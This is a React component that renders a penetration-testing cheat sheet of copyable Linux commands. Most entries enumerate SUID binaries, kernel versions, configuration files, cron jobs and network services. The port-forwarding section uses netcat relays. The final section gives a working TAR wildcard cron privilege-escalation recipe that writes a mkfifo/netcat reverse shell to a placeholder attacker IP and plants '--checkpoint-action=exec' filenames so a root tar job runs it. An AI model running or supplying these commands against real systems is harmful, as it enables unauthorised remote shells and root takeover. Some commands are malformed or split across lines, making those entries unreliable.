import React from "react";
import { Typography, Divider } from "antd";
import QueueAnim from "rc-queue-anim";
const { Title, Paragraph } = Typography;

export default (props) => {
	const Suid = [
		{ title: "find / -user root -perm -4000 -print 2>/dev/null" },
		{ title: "find / -perm -u=s -type f 2>/dev/null" },
		{ title: "find / -user root -perm -4000 -exec ls -ldb {} ;" },
		{ title: "find / -type f -name '*.txt' 2>/dev/null" },
	];
	const VersionSystem = [
		{ title: "cat /etc/issue" },
		{ title: "cat /etc/*-release" },
		{ title: "cat /etc/lsb-release" },
		{ title: "cat /etc/redhat-release" },
	];
	const KernelVersion = [
		{ title: "cat /proc/version" },
		{ title: "uname -a" },
		{ title: "uname -mrs" },
		{ title: "rpm -q kernel" },
		{ title: "dmesg | grep Linux" },
		{ title: "ls /boot | grep vmlinuz" },
	];
	const EnvironmentVariables = [
		{ title: "cat /etc/profile" },
		{ title: "cat /etc/bashrc" },
		{ title: "cat ~/.bash_profile" },
		{ title: "cat ~/.bashrc" },
		{ title: "cat ~/.bash_logout" },
		{ title: "env" },
		{ title: "set" },
	];
	const ServiceSettings = [
		{ title: "cat /etc/syslog.conf" },
		{ title: "cat /etc/chttp.conf" },
		{ title: "cat /etc/lighttpd.conf" },
		{ title: "cat /etc/cups/cupsd.conf" },
		{ title: "cat /etc/inetd.conf" },
		{ title: "cat /etc/apache2/apache2.conf" },
		{ title: "cat /etc/my.conf" },
		{ title: "cat /etc/httpd/conf/httpd.conf" },
		{ title: "cat /opt/lampp/etc/httpd.conf" },
		{ title: "ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/" },
	];
	const CronJobs = [
		{ title: "crontab -l" },
		{ title: "ls -alh /var/spool/cron" },
		{ title: "ls -al /etc/ | grep cron" },
		{ title: "ls -al /etc/cron*" },
		{ title: "cat /etc/cron*" },
		{ title: "cat /etc/at.allow" },
		{ title: "cat /etc/at.deny" },
		{ title: "cat /etc/cron.allow" },
		{ title: "cat /etc/cron.deny" },
		{ title: "cat /etc/crontab" },
		{ title: "cat /etc/anacrontab" },
		{ title: "cat /var/spool/cron/crontabs/root" },
	];
	const UsersHost = [
		{ title: "lsof -i" },
		{ title: "lsof -i :80" },
		{ title: "grep 80 /etc/services" },
		{ title: "netstat -antup" },
		{ title: "netstat -antpx" },
		{ title: "netstat -tulpn" },
		{ title: "chkconfig --list" },
		{ title: "chkconfig --list | grep 3:on" },
		{ title: "last" },
	];
	const PortForwarding = [
		{
			title:
				"# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]",
		},
		{ title: "FPipe.exe -l 80 -r 80 -s 80 192.168.1.7" },
		{
			title:
				"# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]",
		},
		{ title: "ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port" },
		{ title: "ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port" },
		{
			title:
				"# mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe",
		},
		{
			title:
				"mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe # Port Relay",
		},
		{
			title:
				"mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)",
		},
		{ title: "backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc" },
		{
			title:
				"localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)",
		},
	];
	const wildcardPrivesc = [
		{
			title: ` echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip>
        1234 >/tmp/f" > shell.sh`,
		},
		{
			title: `touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"`,
		},
		{
			title: ` touch "/var/www/html/--checkpoint=1"`,
		},
	];
	return (
		<QueueAnim delay={300} duration={1500}>
			<Title
				variant='Title level={3}'
				style={{ fontWeight: "bold", margin: 15 }}
			>
				Useful Linux command for your Penetration Testing
			</Title>
			<Paragraph style={{ margin: 15 }}>
				List of useful commands on Linux
			</Paragraph>
			<Divider dashed />
			<div
				key='a'
				style={{
					padding: 15,
				}}
			>
				<Title level={3}>SUID Commands</Title>
				{Suid.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='b'
				style={{
					padding: 15,
				}}
			>
				<Title level={3}>What version of the system ?</Title>
				{VersionSystem.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='c'
				style={{
					padding: 15,
				}}
			>
				<Title level={3}>What is its kernel version ?</Title>
				{KernelVersion.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<div
				key='d'
				style={{
					padding: 15,
				}}
			>
				<Divider dashed />
				<Title level={3}>What is the environment variables ?</Title>
				{EnvironmentVariables.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='e'
				style={{
					padding: 15,
				}}
			>
				<Title level={3}>
					Service settings, there is any wrong allocation?
				</Title>
				{ServiceSettings.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='f'
				style={{
					padding: 15,
				}}
			>
				<Title level={3}>Is there any cron jobs ?</Title>
				{CronJobs.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='g'
				style={{
					padding: 15,
				}}
			>
				<Title level={3}>
					Other users host communication with the system ?
				</Title>
				{UsersHost.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='h'
				style={{
					padding: 15,
				}}
			>
				<Title level={3}>How to port forwarding ?</Title>
				{PortForwarding.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
			<Divider dashed />
			<div
				key='h'
				style={{
					padding: 15,
				}}
			>
				<Title level={3}>TAR wildcard cronjob privilege escalation </Title>
				{wildcardPrivesc.map((k, i) => {
					return (
						<Paragraph key={i} copyable ellipsis={true}>
							{k.title}
						</Paragraph>
					);
				})}
			</div>
		</QueueAnim>
	);
};
